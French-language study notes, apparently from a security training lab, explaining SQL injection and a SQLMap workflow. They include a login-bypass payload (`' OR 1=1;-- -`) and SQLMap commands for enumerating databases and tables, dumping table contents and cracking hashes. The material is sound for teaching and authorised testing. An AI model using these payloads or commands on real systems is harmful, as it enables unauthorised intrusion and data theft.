**SQL Injection** : vulnérabilité très fréquente → liée à la façon dont un site interagit avec une **base de données** via des requêtes **SQL**.

**Idée clé** : les sites utilisent des **requêtes SQL** pour lire/écrire/modifier les données en DB → si l’entrée utilisateur est mal gérée, ça ouvre la porte à l’injection SQL.

## **SQLi vulnerability**

**Interaction app ↔ DB** : l’application construit une requête **SQL** avec les entrées utilisateur et l’envoie au DBMS.

**Exemple login “normal”** :  
`SELECT * FROM users WHERE username='John' AND password='Un@detectable444';`
→ succès **seulement si** username **ET** password match (opérateur **AND**).

---

**Cause de la SQLi** : **pas de validation/sanitation** des entrées → un attaquant peut injecter du SQL dans un champ.

**Exemple d’injection (bypass login)** : password = `abc' OR 1=1;-- -`  
Requête devient :  
`SELECT * FROM users WHERE username = 'John' AND password='abc' OR 1=1;-- -';`
- `OR 1=1` → condition **toujours vraie** ⇒ la requête renvoie un résultat même si le mot de passe est faux.
- `--` → **commente** le reste de la requête (évite erreurs / neutralise la fin).

**Point clé** : le `'` sert à **fermer la chaîne** du mot de passe (`'abc'`) puis à ajouter une condition logique injectée (`OR 1=1`).

## **SQLMap basics & workflow**

**Pourquoi SQLMap** : automatiser la détection + exploitation SQLi (manuel = long/chiant).

|Commande / option|À quoi ça sert|Exemple|
|---|---|---|
|`sqlmap --help`|Affiche la liste des flags/options disponibles|`sqlmap --help`|
|`sqlmap --wizard`|Lance un mode interactif guidé (idéal débutants)|`sqlmap --wizard`|
|`-u <URL>`|Teste une URL cible (souvent avec paramètres GET)|`sqlmap -u "http://site.tld/page.php?id=1"`|

---

**workflow**

| Étape                    | Objectif                                 | Flags clés           | Commande type                                 | Notes                                                                  |
| ------------------------ | ---------------------------------------- | -------------------- | --------------------------------------------- | ---------------------------------------------------------------------- |
| 1) Tester la cible (GET) | Détecter une SQLi sur un paramètre GET   | `-u`                 | `sqlmap -u "http://.../search?cat=1"`         | Test stabilité, WAF/IDS, paramètre dynamique, types d’injection + DBMS |
| 2) Énumérer les bases    | Lister les bases de données              | `--dbs`              | `sqlmap -u "<url>" --dbs`                     | Donne les noms de DB accessibles                                       |
| 3) Lister les tables     | Lister les tables d’une DB               | `-D`, `--tables`     | `sqlmap -u "<url>" -D users --tables`         | Remplacer `users` par la DB ciblée                                     |
| 4) Dump d’une table      | Extraire les enregistrements d’une table | `-D`, `-T`, `--dump` | `sqlmap -u "<url>" -D users -T thomas --dump` | Peut détecter des **hashes** et proposer stockage/crack dictionnaire   |

---

**Types de SQLi que SQLMap peut trouver (exemples)**

- **boolean-based blind** (conditions vrai/faux)
- **error-based** (provoque erreurs révélatrices)
- **time-based blind** (ex: `SLEEP(5)`)
- **UNION-based** (extraction via `UNION SELECT`)

---

**Cas authentifié / sessions**

- Si l’appli nécessite login/session : utiliser `--cookie="SESSIONID=..."` pour tester **dans le bon contexte** (sinon redirections/refus).

---

**POST-based testing**

- Quand les données sont dans le **body** (login, register…) :
    - Intercepter la requête POST et la sauvegarder en fichier
    - `sqlmap -r intercepted_request.txt`
- Interception des requêtes POST : **hors scope** de la room.

